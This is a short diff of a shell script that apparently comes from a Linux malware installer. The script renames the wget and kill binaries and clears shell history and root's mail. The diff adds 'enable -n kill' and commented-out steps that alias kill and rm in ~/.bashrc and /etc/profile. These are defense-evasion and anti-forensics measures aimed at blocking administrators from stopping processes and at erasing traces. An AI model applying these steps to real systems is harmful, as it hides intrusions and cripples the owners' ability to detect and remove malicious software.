@@ -904,7 +904,22 @@ mv /usr/bin/wget /usr/bin/get
 mv /usr/bin/get /usr/bin/wd1
 mv /usr/bin/kill /usr/bin/kib
 mv /usr/bin/kib /usr/bin/kl1
+enable -n kill
 
+# vi ~/.bashrc << EOF
+# i
+# alias kill='kl1'
+# alias rm='r1m' 
+# ^[
+# :wq
+# EOF
+
+# vi /etc/profile << EOF
+# i
+# alias kill='kl1'
+# alias rm='r1m' 
+# :wq
+# EOF
 
 history -c
 echo > /var/spool/mail/root
